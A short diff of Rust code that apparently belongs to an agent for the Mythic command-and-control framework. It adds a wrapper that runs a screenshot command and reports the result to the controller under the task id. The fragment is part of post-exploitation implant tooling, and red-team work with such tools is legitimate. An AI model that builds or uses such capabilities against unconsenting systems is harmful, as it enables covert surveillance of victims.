@@ -1,6 +1,7 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
+use crate::{AgentTask, mythic_success, mythic_error};
 
 #[cfg(target_os = "windows")]
 use std::fs;
@@ -18,6 +19,15 @@ use winapi::um::errhandlingapi::GetLastError;
 // Command structure for Mythic
 #[derive(Serialize, Deserialize)]
 pub struct ScreenshotArgs {}
+
+/// Wrapper function for compatibility with the tasking system
+pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
+    let args = ScreenshotArgs {};
+    match execute_screenshot(args) {
+        Ok(output) => Ok(mythic_success!(task.id, output)),
+        Err(error) => Ok(mythic_error!(task.id, error)),
+    }
+}
 
 #[cfg(target_os = "windows")]
 #[derive(Serialize)]
